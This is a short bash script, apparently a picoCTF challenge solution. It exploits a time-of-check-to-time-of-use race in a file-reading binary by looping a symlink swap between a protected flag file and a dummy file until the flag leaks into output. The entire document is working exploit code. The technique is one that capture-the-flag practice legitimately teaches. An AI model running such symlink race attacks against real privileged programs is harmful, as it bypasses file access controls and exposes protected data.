cd /home/ctf-player
echo "blahblahblah{xxyy}" > ./dummy_flag.txt

while true; do
  # symbolic link
  ln -sf ./flag.txt ./target.txt

  # run the reader
  ./txtreader ./target.txt > ./output.txt 2>&1 &
  pid=$!

  # avoid swapping too fast
  for i in $(seq 1 100); do :; done

  # swap
  ln -sf ./dummy_flag.txt ./target.txt

  wait $pid

  # is there a flag?
  result=$(cat ./output.txt 2>/dev/null)
  if echo "$result" | grep -q "picoCTF"; then
    echo "$result"
    rm -f ./target.txt ./dummy_flag.txt ./output.txt
    exit 0
  fi
done
